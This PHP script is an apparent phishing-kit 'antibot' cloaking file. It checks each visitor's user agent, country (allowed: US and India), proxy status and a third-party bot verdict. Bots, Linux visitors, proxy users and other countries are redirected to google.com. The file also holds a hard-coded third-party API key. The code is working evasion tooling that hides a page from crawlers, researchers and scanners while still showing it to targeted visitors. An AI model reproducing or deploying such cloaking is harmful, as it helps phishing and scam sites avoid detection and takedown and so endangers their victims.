<?php
error_reporting(0);

$apikey = "lM7LfKCfrPrNlUDjdXN1bYfvgZ0a2qiH"; //Banbot.work API key.
$reditation_bot = "https://href.li/?https://google.com"; //Redirection for bots(maybe a 404 page or some website).
$country_allowed = "US,IN"; //Country Code ex: US, UK, IN(seperated by comma",").

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

function getBrowserx() {

    global $ua;

    $browser = "unknown";

    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $ua))
            $browser = $value;

    return $browser;
}

function getOSx() { 

    global $ua;

    $os_platform = "unknown";

    $os_array = array(
                      '/windows nt 10/i'      =>  'Windows 10',
                      '/windows nt 6.3/i'     =>  'Windows 8.1',
                      '/windows nt 6.2/i'     =>  'Windows 8',
                      '/windows nt 6.1/i'     =>  'Windows 7',
                      '/windows nt 6.0/i'     =>  'Windows Vista',
                      '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                      '/windows nt 5.1/i'     =>  'Windows XP',
                      '/windows xp/i'         =>  'Windows XP',
                      '/windows nt 5.0/i'     =>  'Windows 2000',
                      '/windows me/i'         =>  'Windows ME',
                      '/win98/i'              =>  'Windows 98',
                      '/win95/i'              =>  'Windows 95',
                      '/win16/i'              =>  'Windows 3.11',
                      '/macintosh|mac os x/i' =>  'Mac OS X',
                      '/mac_powerpc/i'        =>  'Mac OS 9',
                      '/linux/i'              =>  'Linux',
                      '/ubuntu/i'             =>  'Ubuntu',
                      '/iphone/i'             =>  'iPhone',
                      '/ipod/i'               =>  'iPod',
                      '/ipad/i'               =>  'iPad',
                      '/android/i'            =>  'Android',
                      '/blackberry/i'         =>  'BlackBerry',
                      '/webos/i'              =>  'Mobile'
                    );
    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $ua))
            $os_platform = $value;

    return $os_platform;
}

function getCountryx($ip, $country_allowed)
{
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip;
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $ipDetails = json_decode($result, true);
    curl_close($ch);
    $country = $ipDetails['geoplugin_countryCode'];
    $country_allowed = explode(",", $country_allowed);
    $countryx = 0;
    foreach($country_allowed  as $cntry)
        if($cntry == $country){
            $countryx = 1;
            break;
        }

    return $countryx;
}

function checkProxyx($ip)
{
    $url = "https://blackbox.ipinfo.app/lookup/".$ip;
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function banbotx($apikey, $ip, $ua)
{
    $url = "https://banbot.work/api/?apikey=".$apikey."&ip=".$ip."&ua=".urlencode($ua);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $check = json_decode($result, true);
    curl_close($ch);
    
    return $check['isbot'];

}

$browserx = getBrowserx();
$osx = getOSx();
$countryx= getCountryx($ip, $country_allowed);
$proxyx = checkProxyx($ip);
$banbot = banbotx($apikey, $ip, $ua);

if($banbot=="yes" || $osx=="unknown" || $osx=="Linux" || $browserx=="unknown" || $countryx==0 || $proxyx=="Y")
  die(header("location: ".$reditation_bot));
?>

